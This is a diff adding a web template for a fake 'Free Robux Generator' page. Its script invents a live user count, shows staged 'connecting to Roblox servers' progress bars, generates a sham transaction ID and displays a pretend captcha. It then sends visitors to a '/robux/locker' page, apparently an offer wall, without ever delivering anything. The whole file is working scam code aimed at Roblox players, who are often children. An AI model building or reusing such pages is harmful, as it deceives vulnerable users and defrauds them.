@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<% const pageTitle = siteName + ' - Free Robux Generator'; %>
+<%- include('partials/head', { pageTitle }) %>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+:root{--bg:#0d0221;--pink:#ff2d95;--cyan:#00fff0;--yellow:#ffe600;--green:#00e676;--card-bg:#160b30;--text:#e0d6ff;--text-dim:#8a7fad}
+body{font-family:'Exo 2',sans-serif;background:var(--bg);color:var(--text);min-height:100vh;overflow-x:hidden}
+body::after{content:'';position:fixed;top:0;left:0;width:100%;height:100%;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,0,0,.03) 2px,rgba(0,0,0,.03) 4px);pointer-events:none;z-index:9999}
+.grid-bg{position:fixed;top:0;left:0;width:100%;height:100%;z-index:0;pointer-events:none}
+.grid-bg canvas{width:100%;height:100%}
+.container{position:relative;z-index:1;max-width:620px;margin:0 auto;padding:30px 20px}
+.top-bar{display:flex;align-items:center;justify-content:space-between;margin-bottom:24px}
+.back-btn{display:inline-flex;align-items:center;gap:8px;color:var(--cyan);text-decoration:none;font-weight:600;padding:10px 20px;border:1px solid rgba(0,255,240,.3);border-radius:8px;transition:all .2s;font-size:14px}
+.back-btn:hover{background:rgba(0,255,240,.1);box-shadow:0 0 15px rgba(0,255,240,.2)}
+.brand{font-family:'Press Start 2P',cursive;font-size:12px;color:var(--pink);text-shadow:0 0 10px var(--pink)}
+.online-badge{display:flex;align-items:center;gap:8px;justify-content:center;margin-bottom:20px;font-size:13px;color:var(--yellow)}
+.online-badge .dot{width:8px;height:8px;border-radius:50%;background:#0f0;animation:pulse 1.5s infinite}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:.3}}
+.hero-robux{text-align:center;margin-bottom:20px}
+.hero-robux img{width:120px;height:120px;border-radius:16px;border:2px solid rgba(0,255,240,.2);margin-bottom:16px;object-fit:cover;display:block;margin-left:auto;margin-right:auto;background:#160b30;padding:14px}
+.hero-robux .badge{display:inline-block;background:linear-gradient(135deg,var(--green),#00b85a);padding:6px 16px;border-radius:20px;font-family:'Press Start 2P',cursive;font-size:8px;color:#06110a;margin-bottom:12px;box-shadow:0 0 18px rgba(0,230,118,.35)}
+.card{background:var(--card-bg);border:1px solid rgba(255,45,149,.15);border-radius:16px;padding:28px;margin-bottom:20px}
+.card h1{font-family:'Press Start 2P',cursive;font-size:14px;color:var(--cyan);text-shadow:0 0 10px var(--cyan);text-align:center;margin-bottom:8px;line-height:1.6}
+.card .sub{text-align:center;color:var(--text-dim);font-size:13px;margin-bottom:16px}
+.card .desc{text-align:center;color:var(--text-dim);font-size:13px;line-height:1.6;margin-bottom:20px;padding:0 10px}
+.steps{display:flex;justify-content:center;gap:8px;margin-bottom:24px}
+.steps .step-dot{width:32px;height:32px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-family:'Press Start 2P',cursive;font-size:10px;border:2px solid var(--text-dim);color:var(--text-dim);transition:all .3s}
+.steps .step-dot.active{border-color:var(--pink);color:var(--pink);box-shadow:0 0 10px rgba(255,45,149,.4)}
+.steps .step-dot.done{border-color:var(--cyan);color:var(--cyan);background:rgba(0,255,240,.1)}
+.step-content{display:none}
+.step-content.active{display:block}
+label{display:block;font-size:13px;font-weight:600;margin-bottom:8px;color:var(--text)}
+input[type="text"]{width:100%;background:rgba(255,255,255,.05);border:1px solid rgba(0,255,240,.2);border-radius:8px;padding:12px 16px;color:var(--text);font-family:'Exo 2',sans-serif;font-size:14px;outline:none;margin-bottom:16px;transition:border-color .2s}
+input[type="text"]:focus{border-color:var(--cyan);box-shadow:0 0 15px rgba(0,255,240,.15)}
+.btn{width:100%;padding:14px;border:none;border-radius:8px;font-family:'Press Start 2P',cursive;font-size:11px;cursor:pointer;transition:all .2s}
+.btn-primary{background:linear-gradient(135deg,var(--pink),#ff6ec7);color:#fff}
+.btn-primary:hover{box-shadow:0 0 25px rgba(255,45,149,.5);transform:translateY(-1px)}
+.btn-primary:disabled{opacity:.5;cursor:not-allowed;transform:none;box-shadow:none}
+.btn-green{background:linear-gradient(135deg,var(--green),#00b85a);color:#06110a}
+.btn-green:hover{box-shadow:0 0 25px rgba(0,230,118,.5);transform:translateY(-1px)}
+.btn-green:disabled{opacity:.5;cursor:not-allowed;transform:none;box-shadow:none}
+.amounts-grid{display:grid;grid-template-columns:repeat(2,1fr);gap:12px;margin-bottom:20px}
+.amount-card{background:rgba(255,255,255,.03);border:2px solid rgba(0,255,240,.15);border-radius:12px;padding:18px 14px;text-align:center;cursor:pointer;transition:all .2s;position:relative}
+.amount-card:hover{border-color:var(--cyan);background:rgba(0,255,240,.06);transform:translateY(-2px)}
+.amount-card.selected{border-color:var(--pink);background:rgba(255,45,149,.08);box-shadow:0 0 18px rgba(255,45,149,.25)}
+.amount-card .icon{font-size:22px;margin-bottom:6px;display:block}
+.amount-card .num{font-family:'Press Start 2P',cursive;font-size:14px;color:var(--cyan);display:block;margin-bottom:4px}
+.amount-card.selected .num{color:var(--pink)}
+.amount-card .lbl{font-size:11px;color:var(--text-dim);text-transform:uppercase;letter-spacing:.5px}
+.amount-card.popular::after{content:'POPULAR';position:absolute;top:-9px;right:10px;background:linear-gradient(135deg,var(--yellow),#ffb703);color:#2b1d00;font-family:'Press Start 2P',cursive;font-size:7px;padding:3px 8px;border-radius:10px}
+.amount-card.max::after{content:'MAX';position:absolute;top:-9px;right:10px;background:linear-gradient(135deg,var(--green),#00b85a);color:#06110a;font-family:'Press Start 2P',cursive;font-size:7px;padding:3px 8px;border-radius:10px}
+.info-row{display:flex;justify-content:space-between;padding:10px 0;border-bottom:1px solid rgba(255,45,149,.08);font-size:13px}
+.info-row .label{color:var(--text-dim)}
+.info-row .value{color:var(--cyan);font-weight:600}
+.info-row .value.amount{color:var(--green);font-family:'Press Start 2P',cursive;font-size:12px}
+.captcha-box{background:rgba(255,255,255,.03);border:1px solid rgba(0,255,240,.15);border-radius:8px;padding:16px;margin:16px 0;display:flex;align-items:center;gap:12px;cursor:pointer;transition:all .2s}
+.captcha-box:hover{border-color:var(--cyan);box-shadow:0 0 10px rgba(0,255,240,.15)}
+.captcha-check{width:22px;height:22px;border:2px solid var(--text-dim);border-radius:4px;display:flex;align-items:center;justify-content:center;transition:all .2s}
+.captcha-box.checked .captcha-check{border-color:var(--cyan);background:var(--cyan);color:var(--bg)}
+.captcha-label{font-size:13px;color:var(--text-dim)}
+.loading-overlay{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(13,2,33,.95);z-index:10000;flex-direction:column;align-items:center;justify-content:center}
+.loading-overlay.show{display:flex}
+.loading-overlay h2{font-family:'Press Start 2P',cursive;font-size:13px;color:var(--cyan);margin-bottom:20px;text-align:center;line-height:1.6;padding:0 20px}
+.loading-overlay p{color:var(--text-dim);font-size:13px;margin-bottom:24px;text-align:center}
+.progress-bar{width:280px;height:8px;background:rgba(255,255,255,.08);border-radius:4px;overflow:hidden}
+.progress-bar .fill{height:100%;width:0;background:linear-gradient(90deg,var(--pink),var(--cyan));border-radius:4px;transition:width .3s}
+.progress-text{font-family:'Press Start 2P',cursive;font-size:10px;color:var(--yellow);margin-top:12px}
+.date-display{text-align:center;font-size:12px;color:var(--text-dim);margin-top:12px}
+.hints{background:rgba(255,230,0,.04);border:1px solid rgba(255,230,0,.15);border-radius:10px;padding:16px;margin-top:18px}
+.hints h4{font-family:'Press Start 2P',cursive;font-size:9px;color:var(--yellow);margin-bottom:10px}
+.hints p{font-size:12px;color:var(--text-dim);line-height:1.6;margin-bottom:6px}
+@media(max-width:600px){.card h1{font-size:11px}.container{padding:20px 14px}.amounts-grid{grid-template-columns:1fr}}
+</style>
+</head>
+<body>
+<%- include('partials/grid-bg') %>
+<div class="loading-overlay" id="loadingOverlay">
+  <h2 id="loadingTitle">CONNECTING TO<br>ROBLOX SERVERS...</h2>
+  <p id="loadingSub">Please wait while we locate your account</p>
+  <div class="progress-bar"><div class="fill" id="progressFill"></div></div>
+  <div class="progress-text" id="progressText">0%</div>
+</div>
+<div class="container">
+  <div class="top-bar">
+    <a href="/" class="back-btn">&larr; Back</a>
+    <div class="brand"><%= siteName %></div>
+  </div>
+  <div class="hero-robux">
+    <img src="/static/robux.png" alt="Robux">
+    <div class="badge">FREE ROBUX GENERATOR</div>
+  </div>
+  <div class="online-badge"><span class="dot"></span><span id="onlineCount">0</span> users generating now</div>
+  <div class="card">
+    <h1>FREE ROBUX GENERATOR</h1>
+    <p class="sub">Works with any Roblox account &mdash; no password required</p>
+    <p class="desc">Enter your Roblox username, select how much Robux you want, and complete a quick device verification. Your Robux will be delivered directly to your account.</p>
+
+    <div class="steps">
+      <div class="step-dot active" data-step="1">1</div>
+      <div class="step-dot" data-step="2">2</div>
+      <div class="step-dot" data-step="3">3</div>
+    </div>
+
+    <div class="step-content active" id="step1">
+      <label>Enter Your Roblox Username</label>
+      <input type="text" id="robloxUsername" placeholder="e.g. builderman" autocomplete="off">
+      <button class="btn btn-primary" id="btnStep1" disabled>SEARCH ACCOUNT &rarr;</button>
+    </div>
+
+    <div class="step-content" id="step2">
+      <label>Choose Robux Amount</label>
+      <div class="amounts-grid" id="amountsGrid">
+        <% amounts.forEach(function(a, i){
+             const isPopular = a === 10000;
+             const isMax = a === 100000;
+             let cls = 'amount-card';
+             if (isPopular) cls += ' popular';
+             else if (isMax) cls += ' max';
+        %>
+          <div class="<%= cls %>" data-amount="<%= a %>">
+            <span class="icon">&#128184;</span>
+            <span class="num"><%= a.toLocaleString('en-US') %></span>
+            <span class="lbl">Robux</span>
+          </div>
+        <% }) %>
+      </div>
+      <button class="btn btn-green" id="btnStep2" disabled>GENERATE ROBUX &rarr;</button>
+    </div>
+
+    <div class="step-content" id="step3">
+      <div class="info-row"><span class="label">Username</span><span class="value" id="dispUser">&mdash;</span></div>
+      <div class="info-row"><span class="label">Amount</span><span class="value amount" id="dispAmount">&mdash;</span></div>
+      <div class="info-row"><span class="label">Status</span><span class="value" style="color:var(--yellow)">Ready for Delivery</span></div>
+      <div class="info-row"><span class="label">Transaction ID</span><span class="value" id="dispTx" style="filter:blur(4px)">RBX-XXXX-XXXX</span></div>
+      <div class="captcha-box" id="captchaBox">
+        <div class="captcha-check" id="captchaCheck"></div>
+        <span class="captcha-label">I'm not a robot</span>
+      </div>
+      <button class="btn btn-green" id="btnStep3" disabled>VERIFY DEVICE &amp; RECEIVE</button>
+    </div>
+    <div class="date-display" id="dateDisplay"></div>
+  </div>
+
+  <div class="hints">
+    <h4>&#128161; HOW IT WORKS</h4>
+    <p>&bull; Enter your <strong>Roblox username only</strong> &mdash; we never ask for your password.</p>
+    <p>&bull; Choose how much Robux you want generated for your account.</p>
+    <p>&bull; Complete a short device verification to prove you're human.</p>
+    <p>&bull; Your Robux will be credited to your Roblox account automatically.</p>
+  </div>
+</div>
+<script>
+const VIRTUAL_PATH='/robux';
+const LOCKER_URL='/robux/locker';
+if(typeof umami!=='undefined')umami.track(p=>({...p,url:VIRTUAL_PATH}));
+document.getElementById('dateDisplay').textContent=new Date().toLocaleDateString('en-US',{weekday:'long',year:'numeric',month:'long',day:'numeric'});
+let fakeOnline=Math.floor(Math.random()*500)+600;
+document.getElementById('onlineCount').textContent=fakeOnline.toLocaleString('en-US');
+setInterval(()=>{fakeOnline+=Math.floor(Math.random()*11)-4;if(fakeOnline<400)fakeOnline=400;document.getElementById('onlineCount').textContent=fakeOnline.toLocaleString('en-US')},3000);
+
+const unameInput=document.getElementById('robloxUsername'),btn1=document.getElementById('btnStep1');
+unameInput.addEventListener('input',function(){btn1.disabled=this.value.trim().length<3});
+btn1.addEventListener('click',()=>showLoading('LOCATING ROBLOX<br>ACCOUNT...','Searching game servers for your username',()=>goStep(2)));
+
+let selectedAmount=0;
+document.querySelectorAll('.amount-card').forEach(card=>{
+  card.addEventListener('click',function(){
+    document.querySelectorAll('.amount-card').forEach(c=>c.classList.remove('selected'));
+    this.classList.add('selected');
+    selectedAmount=parseInt(this.dataset.amount,10);
+    document.getElementById('btnStep2').disabled=false;
+  });
+});
+
+document.getElementById('btnStep2').addEventListener('click',()=>showLoading('PREPARING ROBUX<br>TRANSFER...','Connecting to Roblox payment network',()=>{
+  document.getElementById('dispUser').textContent=unameInput.value.trim();
+  document.getElementById('dispAmount').textContent=selectedAmount.toLocaleString('en-US')+' R$';
+  document.getElementById('dispTx').textContent='RBX-'+rand(4)+'-'+rand(4);
+  try{sessionStorage.setItem('robuxUser',unameInput.value.trim());sessionStorage.setItem('robuxAmount',String(selectedAmount))}catch(_){}
+  goStep(3);
+}));
+
+document.getElementById('captchaBox').addEventListener('click',function(){
+  this.classList.add('checked');
+  document.getElementById('captchaCheck').textContent='\u2713';
+  document.getElementById('btnStep3').disabled=false;
+});
+document.getElementById('btnStep3').addEventListener('click',()=>{window.location.href=LOCKER_URL});
+
+function rand(n){let s='';for(let i=0;i<n;i++)s+='ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'[Math.floor(Math.random()*36)];return s}
+function goStep(n){
+  document.querySelectorAll('.step-content').forEach(s=>s.classList.remove('active'));
+  document.getElementById('step'+n).classList.add('active');
+  document.querySelectorAll('.step-dot').forEach(d=>{
+    const s=parseInt(d.dataset.step);d.classList.remove('active','done');
+    if(s<n)d.classList.add('done');if(s===n)d.classList.add('active');
+  });
+}
+function showLoading(title,sub,cb){
+  const ov=document.getElementById('loadingOverlay'),fill=document.getElementById('progressFill'),txt=document.getElementById('progressText');
+  document.getElementById('loadingTitle').innerHTML=title;
+  document.getElementById('loadingSub').textContent=sub;
+  ov.classList.add('show');let p=0;
+  const iv=setInterval(()=>{p+=Math.random()*15+5;if(p>=100){p=100;clearInterval(iv);setTimeout(()=>{ov.classList.remove('show');cb()},400)}fill.style.width=p+'%';txt.textContent=Math.floor(p)+'%'},200);
+}
+</script>
+</body>
+</html>
